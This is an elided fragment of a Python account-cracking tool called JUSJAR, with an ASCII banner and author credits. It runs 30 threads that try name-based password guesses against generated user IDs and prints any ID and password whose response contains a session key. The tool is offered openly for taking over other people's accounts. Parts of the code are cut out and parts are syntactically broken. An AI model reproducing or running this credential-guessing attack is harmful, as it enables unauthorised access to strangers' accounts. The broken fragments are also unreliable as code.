...
░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░ \033[1;97mX FARYAL                                        
----------------------------------------------
AUTHOR    :  JUSTINE & JARED
TEAM :  KUYA PATURO
FACEBOOK : JARED PELAGIO & JUSTINE CLYDE
TOOL NAME: JUSJAR
VERSION : 0.01
STATUS : FREE
 
------------------------------------------------------------------
\033[1: MAPANGHE TONG NAG BABASA
------------------------------------------------------------------
""")
def linex():
        print('\033[97;1m====================================================================================')
...
def file_crack():
    ...
    try:
        ...
        ps_limit =1
    linex()
    print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123,basta kahit ano ng mapanghe ka')
    linex()
...
def afg():
    ...
    with tred(max_workers=30) as ZIDI:
        ...
        for psx in user:
            ids = code+psx
            passlist = [ids,psx,'first last,last first, last last, first first,first123,first1234,first 123,first 1234,first01,first02,first03,firstpogi,firstcute,firstganda]
            ZIDI.submit(rd1,ids,passlist)
    print('\033[1;37m')
    linex()
    print(' [+] The process has completed')
    ...
    try:
        ...
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [JUSTJAR-OK] '+uid+' | '+pas)
